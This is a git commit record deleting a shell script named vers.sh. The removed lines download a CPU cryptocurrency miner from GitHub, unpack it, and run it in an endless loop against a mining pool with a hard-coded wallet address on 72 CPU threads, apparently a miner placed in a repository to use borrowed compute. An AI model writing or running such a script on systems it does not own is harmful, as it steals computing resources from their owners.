906f9e07223c30c34f9586714efd2a4a96eda0f5
nuri655 <84915784+nuri655@users.noreply.github.com>
2021-06-07 16:50:24 +0700

    Delete vers.sh

--- vers.sh
+++
@@ -1,8 +0,0 @@
-#!/bin/sh
-wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
-tar xf hellminer_cpu_linux.tar.gz
-while [ 1 ]; do
-./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RGeRKo3JYfRnwKwKKSExF77ZdxsoeVTadg.GT -p x --cpu 72
-sleep 3
-done
-sleep 999
